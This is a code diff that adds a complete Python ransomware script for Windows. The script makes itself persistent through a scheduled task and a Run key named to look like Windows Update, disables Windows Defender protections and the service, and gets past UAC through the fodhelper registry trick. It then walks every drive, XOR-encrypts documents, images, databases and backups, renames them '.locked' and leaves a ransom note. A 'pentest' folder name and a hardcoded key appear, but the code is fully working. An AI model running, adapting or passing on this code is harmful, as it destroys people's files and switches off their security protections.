@@ -1,0 +1,234 @@
+import os, sys, ctypes, subprocess, time, threading, shutil
+
+UNLOCK_PASSWORD = "my-test-key-123"
+TARGET_TYPES = ['.docx','.xlsx','.pptx','.pdf','.jpg','.png',
+                '.mp4','.zip','.txt','.sql','.bak','.mp3']
+SKIP_FOLDERS = ['windows', 'program files', 'programdata', 'appdata',
+                'windows.old', '$recycle.bin', 'system volume information']
+
+# === STEP 1: Set persistence so even if killed, it comes back ===
+def set_persistence():
+    try:
+        exe_path = sys.executable if getattr(sys, 'frozen', False) else __file__
+        # Create scheduled task that runs the locker every hour
+        subprocess.run(
+            f'schtasks /create /tn "WindowsUpdateTask" /tr "{exe_path}" /sc hourly /mo 1 /f',
+            shell=True, capture_output=True, timeout=10
+        )
+        # Also add to Run key
+        subprocess.run(
+            f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run '
+            f'/v "WindowsUpdateService" /t REG_SZ /d "{exe_path}" /f',
+            shell=True, capture_output=True, timeout=10
+        )
+    except:
+        pass
+
+# === STEP 2: Kill Windows Defender completely ===
+def kill_defender():
+    try:
+        # Add exclusions for our paths
+        paths_to_exclude = [
+            os.path.expandvars(r'%USERPROFILE%'),
+            'C:\\',
+            sys.executable if getattr(sys, 'frozen', False) else __file__
+        ]
+        for path in paths_to_exclude:
+            subprocess.run(
+                f'powershell -Command "Add-MpPreference -ExclusionPath \'{path}\'"',
+                shell=True, capture_output=True, timeout=10
+            )
+        
+        # Disable real-time monitoring
+        subprocess.run(
+            'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"',
+            shell=True, capture_output=True, timeout=10
+        )
+        
+        # Disable all Defender features
+        subprocess.run(
+            'powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true"',
+            shell=True, capture_output=True, timeout=10
+        )
+        subprocess.run(
+            'powershell -Command "Set-MpPreference -DisableBlockAtFirstSeen $true"',
+            shell=True, capture_output=True, timeout=10
+        )
+        subprocess.run(
+            'powershell -Command "Set-MpPreference -DisableIOAVProtection $true"',
+            shell=True, capture_output=True, timeout=10
+        )
+        subprocess.run(
+            'powershell -Command "Set-MpPreference -DisablePrivacyMode $true"',
+            shell=True, capture_output=True, timeout=10
+        )
+        subprocess.run(
+            'powershell -Command "Set-MpPreference -SubmitSamplesConsent 2"',
+            shell=True, capture_output=True, timeout=10
+        )
+        
+        # Stop Defender service
+        subprocess.run('net stop WinDefend /y', shell=True, capture_output=True, timeout=10)
+        subprocess.run('sc config WinDefend start= disabled', shell=True, capture_output=True, timeout=10)
+    except:
+        pass
+
+# === STEP 3: UAC bypass — no popup ===
+def bypass_uac():
+    try:
+        exe_path = sys.executable if getattr(sys, 'frozen', False) else f'python "{__file__}"'
+        
+        # Create registry entries for fodhelper bypass
+        subprocess.run(
+            'reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command '
+            '/v DelegateExecute /t REG_SZ /d "" /f',
+            shell=True, capture_output=True
+        )
+        subprocess.run(
+            f'reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command '
+            f'/d "{exe_path}" /f',
+            shell=True, capture_output=True
+        )
+        
+        # Trigger fodhelper — runs our code as admin with NO popup
+        subprocess.run('fodhelper.exe', shell=True, capture_output=True)
+        time.sleep(2)
+        
+        # Clean up registry
+        subprocess.run('reg delete HKCU\\Software\\Classes\\ms-settings /f',
+                      shell=True, capture_output=True)
+        
+        # Exit the non-admin instance
+        os._exit(0)
+    except:
+        pass
+
+# === STEP 4: Lock a single file ===
+def lock_file(filepath):
+    try:
+        with open(filepath, 'rb') as f:
+            data = f.read()
+        # XOR encryption — simple but effective
+        key_bytes = UNLOCK_PASSWORD.encode() * 10
+        locked = bytes([data[i] ^ key_bytes[i % len(key_bytes)] 
+                       for i in range(len(data))])
+        with open(filepath, 'wb') as f:
+            f.write(locked)
+        os.rename(filepath, filepath + '.locked')
+        return True
+    except:
+        return False
+
+# === STEP 5: Find all files to lock ===
+def find_files():
+    files = []
+    drives = []
+    bitmask = ctypes.windll.kernel32.GetLogicalDrives()
+    for letter in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ':
+        if bitmask & 1:
+            drives.append(f"{letter}:\\")
+        bitmask >>= 1
+    
+    for drive in drives:
+        try:
+            for folder, subs, filenames in os.walk(drive):
+                # Skip system folders
+                skip = False
+                for skip_f in SKIP_FOLDERS:
+                    if skip_f in folder.lower():
+                        skip = True
+                        break
+                if skip:
+                    subs[:] = []
+                    continue
+                
+                # Remove Windows dirs from subdirectories
+                subs[:] = [s for s in subs if s.lower() not in 
+                          ['windows', 'program files', 'programdata', 'appdata']]
+                
+                for name in filenames:
+                    ext = os.path.splitext(name)[1].lower()
+                    if ext in TARGET_TYPES:
+                        files.append(os.path.join(folder, name))
+        except:
+            continue
+    return files
+
+# === STEP 6: Drop ransom note ===
+def drop_note():
+    note = f"""
+╔══════════════════════════════════╗
+║        YOUR FILES ARE LOCKED     ║
+╠══════════════════════════════════╣
+║ UNLOCK CODE: {UNLOCK_PASSWORD}   ║
+╚══════════════════════════════════╝
+"""
+    try:
+        desktop = os.path.expandvars(r'%USERPROFILE%\Desktop\HOW_TO_UNLOCK.txt')
+        with open(desktop, 'w') as f:
+            f.write(note)
+    except:
+        pass
+
+# === STEP 7: The main locker (runs in background thread) ===
+def locker_main():
+    try:
+        # Find all target files
+        all_files = find_files()
+        
+        # Lock in batches of 200 (fast)
+        locked = 0
+        for i in range(0, len(all_files), 200):
+            batch = all_files[i:i+200]
+            for fp in batch:
+                if lock_file(fp):
+                    locked += 1
+            time.sleep(0.01)
+        
+        # Drop ransom note
+        drop_note()
+        
+        # Save recovery info
+        os.makedirs(os.path.expandvars(r'%TEMP%\pentest'), exist_ok=True)
+        with open(os.path.expandvars(r'%TEMP%\pentest\recovery.txt'), 'w') as f:
+            f.write(f"UNLOCK_PASSWORD={UNLOCK_PASSWORD}\n")
+        
+        # Write count to registry (so we can verify it ran)
+        try:
+            subprocess.run(
+                f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\ '
+                f'/v "LastUpdate" /t REG_SZ /d "Locked {locked} files on {time.ctime()}" /f',
+                shell=True, capture_output=True
+            )
+        except:
+            pass
+    except:
+        pass
+
+# === MAIN: Runs everything ===
+def main():
+    # First run: set persistence so we can't be killed
+    set_persistence()
+    
+    # If not admin, bypass UAC silently
+    if not ctypes.windll.shell32.IsUserAnAdmin():
+        bypass_uac()
+        return
+    
+    # We are admin now — kill Defender first
+    kill_defender()
+    
+    # Wait 5 seconds for Defender to fully disable
+    time.sleep(5)
+    
+    # Run locker in a background thread — keeps it alive
+    lock_thread = threading.Thread(target=locker_main, daemon=False)
+    lock_thread.start()
+    
+    # Keep the main thread alive so the process doesn't exit
+    while True:
+        time.sleep(10)
+
+# === ENTRY POINT ===
+if __name__ == "__main__":
+    main()
